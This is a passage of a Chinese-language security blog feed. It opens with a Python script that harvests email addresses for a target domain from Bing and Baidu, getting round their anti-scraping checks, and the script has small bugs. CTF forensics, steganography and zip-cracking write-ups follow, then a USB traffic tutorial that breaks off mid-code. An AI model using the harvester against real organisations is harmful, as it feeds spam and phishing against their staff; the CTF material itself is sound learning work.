&quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;qs=n&amp;sp=-1&amp;pq=emailsite%3baidu.com&amp;first=1&amp;FROM=PERE1&quot;</span><br><span class=\"line\">    conn = requests.session()</span><br><span class=\"line\">    bing_url = &quot;http://cn.bing.com/search?q=&quot; + key_word + &quot;+site%3a&quot; + url + &quot;&amp;qs=n&amp;sp=-1&amp;pq=&quot; + key_word + &quot;site%3a&quot; + url + &quot;&amp;first=&quot; +str((page-1)*10) + &quot;&amp;FROM=FEERE1&quot;</span><br><span class=\"line\">    conn.get(&#x27;http://cn.bing.com&#x27;,headers=headers(referer))</span><br><span class=\"line\">    r = conn.get(bing_url,stream=True,headers=headers(referer),timeout=8)</span><br><span class=\"line\">    emails = search_email(r.text)</span><br><span class=\"line\">    return emails</span><br></pre></td></tr></table></figure>\n<p>用百度搜索引擎进行邮件爬取。同样的，百度搜索引擎也做了反爬防护，相对于 Bing 来说，百度不仅对 referer 和 cookie 进行校验，也同时在页面中通过 JavaScript 语句进行动态请求链接，从而导致不能动态获取页面中的信息。可以通过对链接的提取，再进行 request 请求，从而绕过百度搜索引擎的反爬设置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def baidu_search(url,page,key_word):</span><br><span class=\"line\">    email_list = []</span><br><span class=\"line\">    emails = []</span><br><span class=\"line\">    referer = &quot;https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;pn=1&quot;</span><br><span class=\"line\">    baidu_url = &quot;https://www.baidu.com/s?wa=&quot;+key_word+&quot;+site%3A&quot;+url+&quot;&amp;pn=&quot;+str((page-1)*10)</span><br><span class=\"line\">    conn = requests.session</span><br><span class=\"line\">    conn.get(referer,headers=headers(referer))</span><br><span class=\"line\">    r = conn.get(baidu_url,headers=headers(referer))</span><br><span class=\"line\">    soup = BeautifulSoup(r.txt,&#x27;html&#x27;)</span><br><span class=\"line\">    tagh3 = soup.find_all(&#x27;h3&#x27;)</span><br><span class=\"line\">    for h3 in tagh3:</span><br><span class=\"line\">        href = h3.find(&#x27;a&#x27;).get(&#x27;href&#x27;)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            r = requests.get(href,headers=headers(referer),timeout=8)</span><br><span class=\"line\">            emails = search_email(r.txt)</span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        for email in emails:</span><br><span class=\"line\">            email_list.append(email)</span><br><span class=\"line\">    return email_list</span><br></pre></td></tr></table></figure>\n<p>接下来通过正则表达式获取邮箱号码，此处也可换成目标企业邮箱的正则表达式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def search_email(html):</span><br><span class=\"line\">    emails = re.findall(r&quot;[a-z0-9\\.\\-+_]+@[a-z0-9\\.\\-+_]+\\.[a-z]+&quot;,html,re.I)</span><br><span class=\"line\">    return emails</span><br><span class=\"line\">def headers(referer):</span><br><span class=\"line\">    headers = &#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0(X11;Linux x86_64;rv:60.0) Gecko/20100101 Firefoc/60.0&#x27;,</span><br><span class=\"line\">               &#x27;Accept&#x27;:&#x27;*/*&#x27;</span><br><span class=\"line\">               &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class=\"line\">               &#x27;Accept-Encoding&#x27;: &#x27;gzip,deflate&#x27;,</span><br><span class=\"line\">               &#x27;Referer&#x27;:referer</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">    return headers</span><br></pre></td></tr></table></figure>\n<p>用 python3 执行脚本，-u 参数指定域名，-p 参数指定搜索引擎的页数，如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ce.py -u &quot;baidu.com&quot; -p 1</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/",
            "title": "安洵杯2023 Misc",
            "date_published": "2024-04-16T05:58:19.041Z",
            "content_html": "<h1 id=\"安洵杯2023-misc\"><a class=\"markdownIt-Anchor\" href=\"#安洵杯2023-misc\">#</a> 安洵杯 2023 Misc</h1>\n<h2 id=\"dacongのwindows\"><a class=\"markdownIt-Anchor\" href=\"#dacongのwindows\">#</a> <strong>dacong の Windows</strong></h2>\n<p>题目描述是：好像什么重要的表被修改了，猜测是注册表文件被修改</p>\n<p>刚开始利用 vol2 进行查看 imageinfo 的信息，发现镜像文件为 win10，于是就改用了 vol3，避免出现一些问题</p>\n<h3 id=\"flag3\"><a class=\"markdownIt-Anchor\" href=\"#flag3\">#</a> flag3：</h3>\n<p>首先按照老套路扫描一下文件，直接 grep 出关键字符串 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f dacong.raw windows.filescan | grep flag</span><br></pre></td></tr></table></figure>\n<p>发现了桌面上的 flag3.txt 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225181103520.png\" alt=\"\"></p>\n<p>dump 下来进行查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f ../../dacong.raw windows.dumpfiles --virtaddr=&quot;0xe0007a09d470&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225181219320.png\" alt=\"\"></p>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U2FsdGVkX18M+E34cKJlmTU3uo1lHqjUQhKPTBGJiMjg4RWX6saTjOJmLU86538e</span><br></pre></td></tr></table></figure>\n<p>发现还套了一层加密，看上去像是 aes，需要寻找 key，而这里的 key 就在题目所提示的注册表当中</p>\n<p>用命令列出注册表的所有键值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f ../../dacong.raw windows.registry.printkey</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225182915579.png\" alt=\"\"></p>\n<p>能发现一个类似 key 的字符串，拿去解密一下试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225183338699.png\" alt=\"\"></p>\n<p>直接用 puzzle 爆破出来了 flag3：dAc0Ng_SIst3Rs???}</p>\n<h3 id=\"flag2\"><a class=\"markdownIt-Anchor\" href=\"#flag2\">#</a> flag2：</h3>\n<p>利用取证大师对文件进行深度恢复之后再次进行自动取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225185122528.png\" alt=\"\"></p>\n<p>发现回收站删除的文件中有个 secret.rar 文件，进行导出并解压</p>\n<p>全选之后根据文本内容提示猜测为 snow 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225185243753.png\" alt=\"\"></p>\n<p>无密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\SNOW.EXE -C flag2.txt</span><br></pre></td></tr></table></figure>\n<p>得到 flag2:_tHE_Dddd</p>\n<h3 id=\"flag1\"><a class=\"markdownIt-Anchor\" href=\"#flag1\">#</a> flag1：</h3>\n<p>利用 R-studio 扫描文件，在 miku 的桌面上发现了很多的 dacong.wav</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225191203991.png\" alt=\"\"></p>\n<p>直接恢复出来发现音频都有些问题，包括之前的 secret.rar 文件用 R-studio 恢复出来也是损坏的，这里可以使用 vol3 进行 dump</p>\n<p>一个个听一下发现 dacong39.wav 是 sstv，用 rxsstv 进行识别得到 flag1</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225200952125.png\" alt=\"\"></p>\n<p>flag1：flag{Ar3_Th3Y</p>\n<p>拼接得到完整 flag</p>\n<p><strong>flag{Ar3_Th3Y_tHE_DddddAc0Ng_SIst3Rs???}</strong></p>\n<h2 id=\"疯狂的麦克斯\"><a class=\"markdownIt-Anchor\" href=\"#疯狂的麦克斯\">#</a> 疯狂的麦克斯</h2>\n<p>拿到三个文件，首先看到了 FLAG.zip，根据题目描述应该是最后的 flag 文件，先看看无后缀的麦克斯的称号</p>\n<p>记事本打开发现存在一些不可见的字符</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225202958815.png\" alt=\"\"></p>\n<p>猜测零宽，解密得到称号 mks007</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225203137452.png\" alt=\"\"></p>\n<p>接着嗨.zip 文件解压出来 word 文件，修改后缀为 zip 之后发现了 MKS<br>\nIM 麦克斯.txt 文件</p>\n<p>打开发现是字符表，文本末尾还有一串字符串</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225203750741.png\" alt=\"\"></p>\n<p>经过尝试得知是凯撒移位</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225204056165.png\" alt=\"\"></p>\n<p>根据后来修改的题目描述可以知道压缩包密码是某个值的 base64，文本末尾算是个凯撒的提示吧，把整个字符表进行凯撒位移</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226135340902.png\" alt=\"\"></p>\n<p>利用脚本将列表中的每个值进行 base64 加密并对压缩包进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">import zipfile</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">zip_file_path = &#x27;your_zip_file.zip&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">values = [&#x27;71132E&#x27;, &#x27;328051N&#x27;, &#x27;248199O&#x27;, &#x27;96369v&#x27;, &#x27;216076R&#x27;,...] #替换成完整列表</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def encode_base64_and_crack_zip(values, zip_file_path):</span><br><span class=\"line\"></span><br><span class=\"line\">    passwords = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    for value in values:</span><br><span class=\"line\"></span><br><span class=\"line\">        encoded_value = base64.b64encode(value.encode()).decode()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        try:</span><br><span class=\"line\"></span><br><span class=\"line\">            with zipfile.ZipFile(zip_file_path, &#x27;r&#x27;) as zip_file:</span><br><span class=\"line\"></span><br><span class=\"line\">                zip_file.extractall(pwd=encoded_value.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">                passwords[encoded_value] = value</span><br><span class=\"line\"></span><br><span class=\"line\">                print(f&quot;Correct password found: &#123;encoded_value&#125; for value: &#123;value&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\"></span><br><span class=\"line\">            pass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    return passwords</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">passwords_dict = encode_base64_and_crack_zip(values, zip_file_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;\\nPasswords and corresponding base64 values:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for password, value in passwords_dict.items():</span><br><span class=\"line\"></span><br><span class=\"line\">    print(f&quot;Password: &#123;password&#125; -&gt; Value: &#123;value&#125;&quot;)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Correct password found: NDU2Nzg4UA== for value: 456788P</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Passwords and corresponding base64 values:</span><br><span class=\"line\"></span><br><span class=\"line\">Password: NDU2Nzg4UA== -&gt; Value: 456788P</span><br></pre></td></tr></table></figure>\n<p>得到密码：NDU2Nzg4UA==</p>\n<p>解压得到 flag</p>\n<p><strong>D0g3{Th1s_REA11Y_MAX_F1A4_GGB0ND}</strong></p>\n<h2 id=\"nahida\"><a class=\"markdownIt-Anchor\" href=\"#nahida\">#</a> <strong>Nahida</strong></h2>\n<p>在 hi.txt 中没有发现什么隐写信息，查看无后缀文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140218726.png\" alt=\"\"></p>\n<p>发现是 jpg 文件的翻转文件，利用脚本逆回来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f: #1.txt中存放原文件的16进制数据</span><br><span class=\"line\"></span><br><span class=\"line\">    x = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">    s = x[::-1]</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&#x27;1.jpg&#x27;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\"></span><br><span class=\"line\">    f.write(bytes.fromhex(s))</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140705500.png\" alt=\"\"></p>\n<p>重新放入 winhex 查看发现末尾多了些乱码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140833855.png\" alt=\"\"></p>\n<p>重新将 16 进制提取出来进行解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226140933203.png\" alt=\"\"></p>\n<p>提示早已出现在你的旅途，和神之眼，猜测是 silenteye</p>\n<p>密码为文件的名称 Nahida，decode 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226141403854.png\" alt=\"\"></p>\n<p><strong>d0g3{Nahida_is_the_best_in_the_world!}</strong></p>\n<h2 id=\"dacongのsecret\"><a class=\"markdownIt-Anchor\" href=\"#dacongのsecret\">#</a> <strong>dacong の secret</strong></h2>\n<p>得到两个附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226141857261.png\" alt=\"\"></p>\n<p>png FFT 得到压缩包密码：d@C0ng 1s cUt3!!!</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142126810.png\" alt=\"\"></p>\n<p>winhex 查看解压出来的 jpg 发现图片末尾存放着压缩包的 16 进制数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142355206.png\" alt=\"\"></p>\n<p>同样 reverse 之后写入到文件当中，根据题目描述可知，这一层的压缩包密码也在 png 当中</p>\n<p>binalk 图片时发现图片中有多余的数据块，tweak 查看下 idat 块</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226142801972.png\" alt=\"\"></p>\n<p>发现最后的 idat 块存在异常，单独提取出来</p>\n<p>补上 dacong1hao.png 的文件头</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143326676.png\" alt=\"\"></p>\n<p>利用 puzzle 对该图片进行 fix，得到解压密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143557938.png\" alt=\"\"></p>\n<p>一眼 base64 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226143911632.png\" alt=\"\"></p>\n<p>解码得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226144533891.png\" alt=\"\"></p>\n<p>pass {m1ku_1s_sha_fufu123}，依然是个 pass，jpg 的 jphide 隐写</p>\n<p>解密得到 flag</p>\n<p><strong>flag{d@C0ng_1s_r3@lIy_Re@iLY_Cute}</strong></p>\n<p>小结：这次比赛 misc 知识点难度倒是不大，但是很套，需要猜的知识点和步骤也比较多</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/USB/",
            "url": "https://nnnpc.github.io/2024/04/16/USB/",
            "title": "USB",
            "date_published": "2024-04-16T05:58:19.038Z",
            "content_html": "<p>最近做到之前经典的流量题有点多，usb 就是其中之一，这里记录一下</p>\n<p>首先 wireshark 打开附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhLcuWbkya0tO5xt.png!thumbnail\" alt=\"\"></p>\n<p>滑动查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vare5xin8L956m56.png!thumbnail\" alt=\"\"></p>\n<p>能发现数据包的 HID<br>\nData 中带有四字节的数据，猜测为鼠标流量，用 tshark 提取 HID Data 数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r usb.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure>\n<p>由于是记录目前常用的两种 usb 协议流量，因此就直接进行说明<br>\n在导出的 usbdata.txt 中可以看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2FMn0yQhFoItARSW.png!thumbnail\" alt=\"\"></p>\n<p>除了 4 字节的鼠标流量之外，还有 16 字节的键盘流量，就借着这个附件说明两种流量解密方法</p>\n<h2 id=\"鼠标流量\"><a class=\"markdownIt-Anchor\" href=\"#鼠标流量\">#</a> 鼠标流量</h2>\n<p>首先利用脚本进行删除空行，冒号分隔的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n<p>输入路径和 8<br>\n 得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LJCTFRII7jB3Gjtb.png!thumbnail\" alt=\"\"></p>\n<p>接着提取坐标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)</span><br><span class=\"line\">f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">posx = 0</span><br><span class=\"line\">posy = 0</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    if len(line) != 12 :</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    x = int(line[3:5],16)</span><br><span class=\"line\">    y = int(line[6:8],16)</span><br><span class=\"line\">    if x &gt; 127 :</span><br><span class=\"line\">        x -= 256</span><br><span class=\"line\">    if y &gt; 127 :</span><br><span class=\"line\">        y -= 256</span><br><span class=\"line\">    posx += x</span><br><span class=\"line\">    posy += y</span><br><span class=\"line\">    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing</span><br><span class=\"line\">    if btn_flag == 1 : # 1 代表左键</span><br><span class=\"line\">        f.write(str(posx))</span><br><span class=\"line\">        f.write(&#x27; &#x27;)</span><br><span class=\"line\">        f.write(str(posy))</span><br><span class=\"line\">        f.write(&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<p>得到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/s7ruj39OHOpkHe8p.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>使用 gnuplot 进行画图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plot &quot;xy.txt&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71m441A1k7qSjpYe.png!thumbnail\" alt=\"\"></p>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9P5nlYJzTTNOtW3K.png!thumbnail\" alt=\"\"></p>\n<p>当然这题的 flag 并不是鼠标流量</p>\n<h2 id=\"键盘流量\"><a class=\"markdownIt-Anchor\" href=\"#键盘流量\">#</a> 键盘流量</h2>\n<p>同样使用前面 tshark 提取出的 usbdata.txt</p>\n<h3 id=\"一\"><a class=\"markdownIt-Anchor\" href=\"#一\">#</a> 一</h3>\n<p>可以使用该脚本进行一把梭（该脚本会将不是 8 字节键盘流量的数据给剔除掉）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, 